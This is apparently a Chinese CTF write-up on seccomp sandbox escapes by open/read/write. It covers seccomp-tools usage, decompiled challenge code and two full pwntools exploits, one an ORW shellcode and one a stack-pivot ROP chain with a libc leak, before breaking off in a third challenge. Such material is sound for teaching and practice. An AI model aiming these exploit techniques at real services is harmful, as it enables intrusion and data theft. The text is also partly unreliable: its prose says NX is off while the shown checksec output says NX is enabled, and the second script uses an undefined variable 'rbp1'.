<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="3e9a6c2b8d04e25ae49c0d70603e37eb">orw</h2>
<p>沙箱机制，英文sandbox，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240822182201-5ebf6be6-6070-1.png"/><br/>
如图禁用execve使得我们不能通过系统调用execve拿到shell，因此只能通过调用<strong>open</strong>, <strong>read</strong>, <strong>write</strong>的来读取并打印flag 内容</p>
<h3 data-content="1" id="0649d6f883f727b8b95c3a2fdb621da5">开启方式</h3>
<ul>
<li>
<p>prctl函数调用</p>
</li>
<li>
<p>seccomp库函数</p>
<p>分为白箱（只允许白名单的函数调用）和黑箱（禁用黑名单的某些函数）</p>
</li>
</ul>
<h3 data-content="1" id="df985b96aaceaee8a40ccb8eb12c2c7d">工具安装</h3>
<div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">apt</span> <span class="n">install</span> <span class="n">gcc</span> <span class="n">ruby</span><span class="o">-</span><span class="n">dev</span>

<span class="n">sudo</span> <span class="n">gem</span> <span class="n">install</span> <span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span>
</pre></div>
<h3 data-content="1" id="6fdaa64352d65ad9e40812ae024bb357">查看保护</h3>
<div class="highlight"><pre><span></span><span class="n">seccomp</span><span class="o">-</span><span class="n">tools</span> <span class="n">dump</span> <span class="o">./</span><span class="n">pwn</span>
</pre></div>
<h3 data-content="1" id="857099f2f6b7e31cdb821a431e8c0a8a">绕过方式</h3>
<ul>
<li>
<p>### shellocde绕过</p>
</li>
<li>
<p>### ROP绕过</p>
</li>
</ul>
<h3 data-content="1" id="19d94208f472830b74e3fa4704880ede">利用方式</h3>
<p>在题目中我们的目标是拿到flag，既然拿不到shell，那就直接读取flag</p>
<h2 data-content="1" id="5560f4c03dadb4c05bdfec9fb82106d1">例题</h2>
<h3 data-content="1" id="92b0cbde1d5b899bc8641dcd1e7ac125">sandbox</h3>
<p>简单的shellocde绕过</p>
<h4 data-content="1" id="7f369046080470e64273444ed840626e">ida</h4>
<div class="highlight"><pre><span></span><span class="n">void</span> <span class="o">*</span><span class="n">inited</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">0</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
  <span class="n">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>

  <span class="n">init_io</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
  <span class="n">banner</span><span class="p">();</span>
  <span class="n">inited</span> <span class="o">=</span> <span class="n">init_UC</span><span class="p">();</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="n">init_global</span><span class="p">();</span>
  <span class="n">read_from_user</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
  <span class="n">parse_ins</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">inited</span><span class="p">);</span>
  <span class="n">init_machine</span><span class="p">(</span><span class="n">inited</span><span class="p">);</span>
  <span class="n">emulator</span><span class="p">(</span><span class="n">v5</span><span class="p">,</span> <span class="n">inited</span><span class="p">);</span>
  <span class="n">run</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</pre></div>
<p>read_from_user</p>
<div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">__fastcall</span> <span class="n">read_from_user</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">18</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
  <span class="n">void</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">10</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">8</span><span class="n">h</span><span class="p">]</span>

  <span class="n">v4</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="il">0L</span><span class="n">L</span><span class="p">;</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">"How long do you need to enter ?"</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s2">"&gt; "</span><span class="p">);</span>
  <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s2">"</span><span class="si">%ld</span><span class="s2">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v2</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mh">0x200</span> <span class="p">)</span>
    <span class="n">Error</span><span class="p">(</span><span class="s2">"Too long!"</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="n">s</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">));</span>
  <span class="k">if</span> <span class="p">(</span> <span class="err">!</span><span class="n">s</span> <span class="p">)</span>
    <span class="n">Error</span><span class="p">(</span><span class="s2">"Malloc error"</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">));</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span> <span class="o">=</span> <span class="n">s</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="s2">"Your input : "</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">void</span> <span class="o">**</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="p">)</span>
    <span class="n">Error</span><span class="p">(</span><span class="s2">"Read error"</span><span class="p">);</span>
  <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">const</span> <span class="n">char</span> <span class="o">**</span><span class="p">)</span><span class="n">a1</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">"OK, I got it...</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<ul>
<li>banner输出banner地址，有了此地址可以绕过pie保护</li>
<li>init_UC、init_global初始化工作，分配堆快</li>
<li>read_from_user读入用户输入的内容</li>
<li>parse_ins解析用户输入的内容为汇编指令</li>
<li>init_machine分配和映射某些地址</li>
<li>emulator检查了系统调用号，不允许为0x3b</li>
<li>run将内存赋予可读可写可执行权限执行输入的shellcode</li>
</ul>
<p>NX保护未开启、存在rwx段</p>
<div class="highlight"><pre><span></span><span class="o">[*]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">jinxi</span><span class="o">/</span><span class="err">桌面</span><span class="o">/</span><span class="err">题目</span><span class="o">/</span><span class="mi">3</span><span class="o">/</span><span class="n">pwn</span><span class="err">'</span>
    <span class="nl">Arch:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="nl">RELRO:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
    <span class="nl">Stack:</span>    <span class="n">Canary</span> <span class="n">found</span>
    <span class="nl">NX:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="nl">PIE:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
</pre></div>
<p>用shellcraft构造就行</p>
<pre><code>shellcode = shellcraft.open('/flag')
shellcode += shellcraft.read('3',bss+0x900,100)
shellcode += shellcraft.write(1,bss+0x900,100)
shellcode = asm(shellcode)</code></pre>
<p>这里read里的fd写3是因为程序执行的时候文件描述符是从3开始的，write里的1是标准输出到显示器，</p>
<p>拿到shell<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240822182216-67f75b06-6070-1.png"/><br/>
完整exp</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="c1">#io = remote('47.100.137.175',31163)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>

<span class="c1">#libc = ELF('./libc.so.6')</span>

<span class="c1">#libcc = cdll.LoadLibrary('./libc.so.6')</span>
<span class="c1">#libcc.srand(libcc.time(0))</span>

<span class="k">def</span> <span class="nf">duan</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>
<span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'A gift for you : '</span><span class="p">)</span>
<span class="n">elf_addr</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">))</span>
<span class="n">elf_base</span> <span class="o">=</span> <span class="n">elf_addr</span> <span class="o">-</span> <span class="mh">0x1572</span>
<span class="n">bss</span> <span class="o">=</span> <span class="n">elf_base</span> <span class="o">+</span> <span class="mh">0x5020</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">'/flag'</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s1">'3'</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x900</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">bss</span><span class="o">+</span><span class="mh">0x900</span><span class="p">,</span><span class="mi">100</span><span class="p">)</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"&gt; "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">"Your input : "</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="88e11a6ff6df4a1400ed4f7f59eea9a9">stack</h3>
<p>简单的栈迁移构造rop的orw</p>
<p>看一眼ida</p>
<div class="highlight"><pre><span></span><span class="n">ssize_t</span> <span class="nf">func</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="m">320</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-140h] BYREF</span>

  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="m">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="m">0L</span><span class="n">L</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"please enter your content:"</span><span class="p">);</span>
  <span class="n">read</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="n">x150uLL</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">"please enter your content again:"</span><span class="p">);</span>
  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="m">0</span><span class="n">x150uLL</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>有两个read功能</p>
<div class="highlight"><pre><span></span><span class="o">[*]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">jinxi</span><span class="o">/</span><span class="err">桌面</span><span class="o">/</span><span class="err">题目</span><span class="o">/</span><span class="n">zhy</span><span class="o">/</span><span class="n">stack</span><span class="o">/</span><span class="n">pwn</span><span class="err">'</span>
    <span class="nl">Arch:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="nl">RELRO:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
    <span class="nl">Stack:</span>    <span class="n">No</span> <span class="n">canary</span> <span class="n">found</span>
    <span class="nl">NX:</span>       <span class="n">NX</span> <span class="n">enabled</span>
    <span class="nl">PIE:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="o">(</span><span class="mi">0</span><span class="n">x400000</span><span class="o">)</span>
</pre></div>
<p>开了ASLR和NX保护</p>
<h4 data-content="1" id="50d3aecc4e4d1fe1612eb65809a851a0">思路</h4>
<ul>
<li>通过printf泄露出栈的地址</li>
<li>栈迁移泄露libc基址</li>
<li>再次通过printf泄露出迁移的栈的地址</li>
<li>构造orw读取flag</li>
</ul>
<p>exp如下</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">ctypes</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">'debug'</span>
<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="c1">#io = remote('47.100.137.175',31163)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">'./pwn'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./libc-2.23.so"</span><span class="p">)</span>
<span class="c1">#libcc = cdll.LoadLibrary('./libc.so.6')</span>
<span class="c1">#libcc.srand(libcc.time(0))</span>
<span class="k">def</span> <span class="nf">duan</span><span class="p">():</span>
    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x4007E0</span> <span class="c1"># elf.plt['puts']</span>
<span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">"puts"</span><span class="p">]</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400B93</span>
<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x400A74</span>
<span class="n">func_addr</span> <span class="o">=</span> <span class="mh">0x400A76</span>
<span class="c1"># ret = 0x400799</span>
<span class="n">payload1</span> <span class="o">=</span> <span class="s2">"a"</span> <span class="o">*</span> <span class="mh">0x140</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"please enter your content:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload1</span><span class="p">)</span>
<span class="n">rbp</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">success</span><span class="p">(</span><span class="s2">"rbp1 -&gt; {:#x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rbp1</span><span class="p">))</span>
<span class="n">buf</span> <span class="o">=</span> <span class="n">rbp1</span> <span class="o">-</span> <span class="mh">0x150</span>
<span class="n">payload2</span> <span class="o">=</span> <span class="p">(</span>
<span class="n">p64</span><span class="p">(</span><span class="n">rbp1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span>
<span class="n">p64</span><span class="p">(</span><span class="n">func_addr</span><span class="p">)</span>
<span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x140</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"please enter your content again:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload2</span><span class="p">)</span>
<span class="n">lib</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"puts"</span><span class="p">]</span>
<span class="n">success</span><span class="p">(</span><span class="s2">"libc_base -&gt; {:#x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">lib</span><span class="p">))</span>
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">lib</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rdi;ret"</span><span class="p">)))</span>
<span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">lib</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rsi;ret"</span><span class="p">)))</span>
<span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">lib</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s2">"pop rdx;ret"</span><span class="p">)))</span>
<span class="n">open_addr</span> <span class="o">=</span> <span class="n">lib</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"open"</span><span class="p">]</span>
<span class="n">write_addr</span> <span class="o">=</span> <span class="n">lib</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"write"</span><span class="p">]</span>
<span class="n">read_addr</span> <span class="o">=</span> <span class="n">lib</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"read"</span><span class="p">]</span>
<span class="n">payload3</span> <span class="o">=</span> <span class="s2">"a"</span> <span class="o">*</span> <span class="mh">0x140</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"please enter your content:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload3</span><span class="p">)</span>
<span class="n">rbp2</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"</span><span class="se">\x7f</span><span class="s2">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">))</span>
<span class="n">success</span><span class="p">(</span><span class="s2">"rbp2 -&gt; {:#x}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rbp2</span><span class="p">))</span>
<span class="n">buf</span> <span class="o">=</span> <span class="n">rbp2</span> <span class="o">-</span> <span class="mh">0x270</span>
<span class="n">payload4</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"./flag</span><span class="se">\x00\x00</span><span class="s2">"</span>
<span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">open_addr</span><span class="p">)</span>
<span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_addr</span><span class="p">)</span>
<span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
<span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x140</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span><span class="p">)</span>
<span class="n">payload4</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"please enter your content again:</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="n">payload4</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h3 data-content="1" id="2e77403a12cbae476ba770dd292a52f1">黄河流域 ----  alarm</h3>
<p>开启沙箱禁用execve</p>
<div class="highlight"><pre><span></span><span class="n">line</span>  <span class="n">CODE</span>  <span class="n">JT</span>   <span class="n">JF</span>      <span class="n">K</span>
<span class="o">=================================</span>
 <span class="mi">0000</span><span class="o">:</span> <span class="mi">0</span><span class="n">x20</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000004</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">arch</span>
 <span class="mi">0001</span><span class="o">:</span> <span class="mi">0</span><span class="n">x15</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x02</span> <span class="mi">0</span><span class="n">xc000003e</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">ARCH_X86_64</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0004</span>
 <span class="mi">0002</span><span class="o">:</span> <span class="mi">0</span><span class="n">x20</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000000</span>  <span class="n">A</span> <span class="o">=</span> <span class="n">sys_number</span>
 <span class="mi">0003</span><span class="o">:</span> <span class="mi">0</span><span class="n">x15</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x01</span> <span class="mi">0</span><span class="n">x0000003b</span>  <span class="k">if</span> <span class="o">(</span><span class="n">A</span> <span class="o">!=</span> <span class="n">execve</span><span class="o">)</span> <span class="n">goto</span> <span class="mi">0005</span>
 <span class="mi">0004</span><span class="o">:</span> <span class="mi">0</span><span class="n">x06</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00</span> <span class="mi">0</span><span class="n">x00000000</span>  <span class="k">return</span> <span class="n">KILL</span>
